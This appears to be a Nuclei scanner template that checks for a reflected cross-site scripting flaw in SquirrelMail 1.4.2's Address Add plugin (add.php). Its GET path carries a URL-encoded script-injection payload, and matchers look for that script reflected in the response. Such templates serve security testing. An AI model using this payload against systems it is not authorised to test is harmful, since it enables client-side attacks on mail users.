id: squirrelmail-address-xss
info:
  author: dhiyaneshDk
  description: SquirrelMail Address Add Plugin is prone to a cross-site scripting
    vulnerability because it fails to properly sanitize user-supplied input.
  name: SquirrelMail 1.4.2 Address Add Plugin - 'add.php' Cross-Site Scripting
  reference:
  - https://www.exploit-db.com/exploits/26305
  severity: medium
  tags: xss,squirrelmail,plugin
requests:
- matchers:
  - status:
    - 200
    type: status
  - part: body
    type: word
    words:
    - </script><script>alert(document.domain)</script>
  - part: header
    type: word
    words:
    - text/html
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/plugins/address_add/add.php?first=HOVER%20ME!%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'
